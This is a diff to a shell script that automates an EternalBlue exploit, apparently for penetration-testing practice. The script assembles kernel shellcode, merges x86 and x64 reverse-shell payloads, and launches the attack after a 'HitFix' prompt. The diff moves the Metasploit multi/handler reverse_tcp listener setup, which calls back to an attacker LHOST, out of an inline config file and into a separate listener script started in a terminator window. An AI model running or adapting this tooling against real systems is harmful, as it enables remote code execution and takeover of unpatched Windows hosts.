@@ -12,17 +12,19 @@ TARGETTYPE=$5
 nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
 nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
 
-touch config.rc
-echo use exploit/multi/handler > config.rc
-echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
-echo set LHOST $LHOST >> config.rc
-echo set LPORT $X64PORT >> config.rc
-echo set ExitOnSession false >> config.rc
-echo set EXITFUNC thread >> config.rc
-echo exploit -j >> config.rc
-echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
-echo set LPORT $X86PORT >> config.rc
-echo exploit -j >> config.rc
+
+
+# touch config.rc
+# echo use exploit/multi/handler > config.rc
+# echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
+# echo set LHOST $LHOST >> config.rc
+# echo set LPORT $X64PORT >> config.rc
+# echo set ExitOnSession false >> config.rc
+# echo set EXITFUNC thread >> config.rc
+# echo exploit -j >> config.rc
+# echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
+# echo set LPORT $X86PORT >> config.rc
+# echo exploit -j >> config.rc
 
 echo Generating x64 rev shell on port $X64PORT...
 echo
@@ -37,14 +39,9 @@ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
 python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 echo Done with shell prep. Get ready to try harder.
 echo
-startListeners='
-/etc/init.d/postgresql start
-msfconsole -r config.rc
-/etc/init.d/postgresql stop
-rm config.rc'
-echo "$startListeners" | xclip -selection c
-echo Open a split terminal here, and paste in what has been copied to your clipboard to start your listeners.
-echo "Once they are listening, type 'HitFix' to begin the exploit."
+terminator -T "listeners" -e "./slisten.sh ${LHOST} ${X64PORT} ${X86PORT} ; bash"
+
+echo "Once listeners are listening, type 'HitFix' to begin the exploit."
 read HitFixCheck
 if [[ $HitFixCheck -eq HitFix ]]
 then
@@ -61,9 +58,3 @@ then
 else
 	echo Restart, something is wrong.
 fi
-
-
-
-
-
-
